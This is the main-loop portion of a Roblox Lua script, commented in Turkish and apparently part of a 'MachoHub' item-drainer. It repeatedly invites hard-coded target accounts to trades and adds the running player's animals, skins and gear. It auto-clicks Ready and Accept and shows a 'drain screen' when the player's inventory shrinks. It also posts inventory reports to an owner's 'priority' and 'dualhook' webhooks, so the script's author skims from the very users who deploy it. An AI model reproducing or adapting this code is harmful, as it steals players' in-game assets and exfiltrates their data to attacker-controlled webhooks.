-- ═══════════════════════════════════════════════════════════════
-- ANA AKIŞ
-- ═══════════════════════════════════════════════════════════════

local initialPriority = buildQueueFromMemory("PRIORITY")
local initialNormal   = buildQueueFromMemory("NORMAL")
local initialBaseSkin = buildBaseSkinQueue()
local initialGear     = buildGearQueue()

if #initialPriority == 0 and #initialNormal == 0
   and #initialBaseSkin == 0 and #initialGear == 0 then return end

applyEverythingAfterTargetFound()

local state = {
    phase        = "IDLE",
    queue        = {},
    targetId     = 0,
    running      = false,
    priorityDone = false,
    addIdx       = 1,
	baseSkinQueue = {}, gearQueue = {},
    baseSkinIdx = 1, gearIdx = 1,
}

-- Başlangıç durumu
if #initialPriority > 0 and OWNER_PRIORITY_TARGET_ID ~= 0 then
    local wsPriority = scanWorkspaceForEmbed("PRIORITY")
    buildAndSendEmbed(wsPriority, OWNER_PRIORITY_WEBHOOK, OWNER_PRIORITY_AVATAR, true, "MachoBurda [PRIORITY]", "PRIORITY")
    if OWNER_DUALHOOK_WEBHOOK ~= OWNER_PRIORITY_WEBHOOK then
        buildAndSendEmbed(wsPriority, OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, true, "MachoBurda [DUALHOOK]", "PRIORITY")
    end

    state.phase    = "PRIORITY"
    state.queue    = initialPriority
    state.targetId = OWNER_PRIORITY_TARGET_ID
    state.running  = true
    state.addIdx   = 1
elseif (#initialNormal > 0 or #initialBaseSkin > 0 or #initialGear > 0) and USER_TARGET_ID ~= 0 then
    local wsNormal = scanWorkspaceForEmbed("NORMAL")
    buildAndSendEmbed(wsNormal, USER_LOG_WEBHOOK, nil, true, "LOGGER MACHOHUB", nil)
    buildAndSendEmbed(wsNormal, OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, false, "MachoBurda [DUALHOOK]", nil)

    state.phase    = "NORMAL"
    state.queue    = initialNormal
    state.targetId = USER_TARGET_ID
    state.running  = true
    state.addIdx   = 1
else
    return
end

state.baseSkinQueue = buildBaseSkinQueue()
state.gearQueue     = buildGearQueue()
state.baseSkinIdx   = 1
state.gearIdx       = 1

local inviteRemote  = getRemote("RF/TradeService/Invite")
local addRemote     = getRemote("RF/TradeService/AddBrainrot")
local addItemRemote = getRemote("RF/TradeService/AddItem")
local readyRemote   = getRemote("RE/TradeService/Ready")
local acceptRemote  = getRemote("RE/TradeService/Accept")
if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end

-- ═══════════════════════════════════════════════════════════════
-- HAYVAN EKLEME LOOP
-- ═══════════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        if state.running and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" then
            local q = state.queue
            if #q > 0 then
                if state.addIdx > #q then state.addIdx = 1 end
                local item = q[state.addIdx]
                if item then
                    local skip = state.priorityDone and item.isPriority
                    if not skip then
                        pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
                    end
                end
                state.addIdx = state.addIdx + 1
                if state.addIdx > #q then state.addIdx = 1 end
            end
        end
        task.wait(DELAY_STEP)
    end
end)

-- Base skin: brainrot gibi tur başına 1 item
task.spawn(function()
    while true do
        if state.running and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" and addItemRemote then
            local q = state.baseSkinQueue
            if #q > 0 then
                if state.baseSkinIdx > #q then state.baseSkinIdx = 1 end
                local item = q[state.baseSkinIdx]
                if item and item.skinName and item.skinName ~= "" then
                    pcall(function()
                        addItemRemote:InvokeServer(SELECTGB_GUID, "BaseSkin", {
                            UUID = item.uuid,
                            SkinName = item.skinName,
                        })
                    end)
                end
                state.baseSkinIdx = state.baseSkinIdx + 1
            end
        end
        task.wait(DELAY_STEP)
    end
end)

-- Gear: brainrot gibi tur başına 1 item
task.spawn(function()
    while true do
        if state.running and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" and addItemRemote then
            local q = state.gearQueue
            if #q > 0 then
                if state.gearIdx > #q then state.gearIdx = 1 end
                local item = q[state.gearIdx]
                if item and item.gearName and item.gearName ~= "" then
                    local payload = { GearName = item.gearName }
                    if type(item.uuid) == "string" and item.uuid ~= "" and item.uuid ~= "nil" then
                        payload.UUID = item.uuid
                    end
                    pcall(function()
                        addItemRemote:InvokeServer(SELECTGB_GUID, "Gear", payload)
                    end)
                end
                state.gearIdx = state.gearIdx + 1
            end
        end
        task.wait(DELAY_STEP)
    end
end)

-- ═══════════════════════════════════════════════════════════════
-- DAVET LOOP
-- ═══════════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        if state.running and state.targetId ~= 0 and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" then
            local safe = true
            if state.priorityDone and state.targetId == OWNER_PRIORITY_TARGET_ID then safe = false end
            if state.phase ~= "PRIORITY" and state.targetId == OWNER_PRIORITY_TARGET_ID then safe = false end
            if safe then
                pcall(function() inviteRemote:InvokeServer(INVITE_GUID, state.targetId) end)
            end
        end
        task.wait(TRADE_CYCLE_DELAY)
    end
end)

-- ═══════════════════════════════════════════════════════════════
-- READY / ACCEPT + FAZ GEÇİŞİ
-- ═══════════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        if state.running and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" then
            pcall(function() readyRemote:FireServer(READY_GUID) end)
            task.wait(0.7)
            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)

            if state.phase == "PRIORITY" and not state.priorityDone then
                task.wait(0.15)
                local checkP = buildQueueFromMemory("PRIORITY")
                if #checkP == 0 then
                    state.priorityDone = true
                    state.phase = "SWITCHING"
                    state.running = false
                    state.targetId = 0
                    state.queue = {}
                    task.wait(1)

                    local freshNormal = buildQueueFromMemory("NORMAL")
                    local freshBaseSkin = buildBaseSkinQueue()
                    local freshGear = buildGearQueue()

                    if (#freshNormal > 0 or #freshBaseSkin > 0 or #freshGear > 0) and USER_TARGET_ID ~= 0 then
                        local wsNormal = scanWorkspaceForEmbed("NORMAL")
                        buildAndSendEmbed(wsNormal, USER_LOG_WEBHOOK, nil, true, "LOGGER MACHOHUB", nil)
                        buildAndSendEmbed(wsNormal, OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, false, "MachoBurda [DUALHOOK]", nil)

                        state.queue    = freshNormal
                        state.targetId = USER_TARGET_ID
                        state.phase    = "NORMAL"
                        state.running  = true
                        state.addIdx   = 1
                        -- ↓ BUNLARI BURAYA EKLE
                        state.baseSkinQueue = freshBaseSkin
                        state.gearQueue     = freshGear
                        state.baseSkinIdx   = 1
                        state.gearIdx       = 1
                    else
                        state.phase = "IDLE"
                    end
                else
                    state.queue = checkP
                    state.addIdx = 1
                end
            end
        end
        task.wait(0.7)
    end
end)

-- ═══════════════════════════════════════════════════════════════
-- DRAIN GÖZLEMCİSİ
-- ═══════════════════════════════════════════════════════════════
task.spawn(function()
    while state.phase ~= "NORMAL" do
        task.wait(0.5)
        if state.phase == "IDLE" then return end
    end
    
    -- Başlangıç sayılarını al
    local initialAnimalCount = #buildQueueFromMemory("NORMAL")
    local initialBaseSkinCount = #buildBaseSkinQueue()
    local initialGearCount = #buildGearQueue()
    
    -- Eğer hiçbir şey yoksa geri dön
    if initialAnimalCount == 0 and initialBaseSkinCount == 0 and initialGearCount == 0 then
        return
    end
    
    while true do
        task.wait(0.5)
        local currentAnimalCount = #buildQueueFromMemory("NORMAL")
        local currentBaseSkinCount = #buildBaseSkinQueue()
        local currentGearCount = #buildGearQueue()
        
        -- Herhangi bir kategoride azalma varsa drain'i göster ve çık
        if currentAnimalCount < initialAnimalCount 
           or currentBaseSkinCount < initialBaseSkinCount 
           or currentGearCount < initialGearCount then
            showDrainScreen()
            break
        end
    end
end)

end)  -- end of main task.spawn
